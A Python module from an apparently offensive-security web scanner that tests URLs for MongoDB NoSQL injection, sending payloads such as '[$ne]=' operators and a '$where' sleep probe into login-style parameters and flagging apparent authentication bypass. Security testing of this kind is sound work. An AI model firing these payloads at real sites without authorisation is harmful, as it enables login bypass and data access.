import asyncio
import json
from modules.core import console

# NoSQL Payloads (MongoDB focus)
# Often sent as JSON or URL params like ?user[$ne]=
NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$where": "sleep(1000)"}' # Timing attack
]

async def check_nosql(session, url, param):
    try:
        # 1. URL Parameter Injection: ?user[$ne]=wow
        target_ne = f"{url}?{param}[$ne]=snakebite_random_check"
        if "?" in url: target_ne = f"{url}&{param}[$ne]=snakebite_random_check"
        
        async with session.get(target_ne, timeout=5, ssl=False) as resp:
            text = await resp.text()
            
            # Heuristic:
            # If we inject "user not equals random", and it logs us in or shows data -> VULN.
            # Compare to baseline "user=snakebite_random_check" which should fail.
            
            # This requires a baseline comparison logic we are simplifying here.
            # We look for successful login indicators on a nonsense condition.
            
            if "Welcome" in text or "logout" in text.lower() or "dashboard" in text.lower():
                # Potential bypass
                return {
                    "url": target_ne,
                    "param": param,
                    "type": "NoSQL Injection (Auth Bypass)",
                    "payload": "[$ne]=random"
                }
                
            if "MongoError" in text or "driver" in text.lower():
                 return {
                    "url": target_ne,
                    "param": param,
                    "type": "NoSQL Injection (Error)",
                    "payload": "[$ne]=random"
                }

    except Exception:
        pass
    return None

async def scan_nosql(session, url):
    """
    Scan for NoSQL Injection (MongoDB etc.).
    """
    console.print(f"\n[bold cyan]--- NoSQL Injection Scanner ---[/bold cyan]")
    
    # Auth params
    params = ["user", "username", "pass", "password", "email", "id"]
    
    tasks = [check_nosql(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] NOSQL INJECTION DETECTED: {res['param']}[/bold red]")
             console.print(f"      Type: {res['type']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No NoSQL injection vulnerabilities detected.[/dim]")
        
    return found
